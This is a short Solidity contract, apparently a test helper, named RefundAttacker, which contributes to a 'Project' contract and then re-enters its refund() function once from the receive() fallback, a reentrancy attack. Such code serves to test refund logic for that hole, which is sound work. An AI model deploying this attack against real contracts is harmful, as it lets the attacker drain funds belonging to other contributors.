// SPDX-License-Identifier: Unlicense
pragma solidity 0.8.17;

import "./Contributor.sol";

contract RefundAttacker {
    bool private attacked;
    Project private victim;

    constructor(Project _victim) {
        victim = _victim;
    }

    function contribute() public payable {
        victim.contribute{value: msg.value}();
    }

    function attack() public {
        victim.refund();
    }

    
    receive() external payable {
        if(!attacked) {
            attacked = true;
            victim.refund();
        }
    } 
}